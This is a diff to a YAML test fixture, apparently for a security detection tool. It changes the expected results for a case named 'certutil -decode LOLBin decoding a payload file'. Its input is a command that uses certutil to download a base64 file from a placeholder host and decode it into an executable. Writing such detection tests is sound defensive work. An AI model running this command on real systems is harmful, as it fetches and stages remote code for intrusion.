@@ -1,19 +1,12 @@
 description: certutil -decode LOLBin decoding a payload file
 expected:
   artifact_types: []
-  attack_chain: []
-  attack_fingerprint_hash: 756a8b8a17abbdb9d55c6b8b2eb06a00b2c220b5e40b256e1085b0d7bcb0bdd0
+  attack_fingerprint_hash: null
   behavior_codes: []
   benign: false
-  derived_risk_score: 0
-  derived_verdict: benign
   ioc_kinds: []
   mitre: []
-  provenance_hash: 188384f02a9c90952be7c99933052245cb0016b87de649803e70dea875bbc700
-  terminal_state: canonical
-  timeline:
-  - - rte.convergence
-    - canonical
+  terminal_state: null
 input:
   inline: certutil.exe -urlcache -split -f https://example.invalid/x.b64 x.b64 &&
     certutil.exe -decode x.b64 x.exe
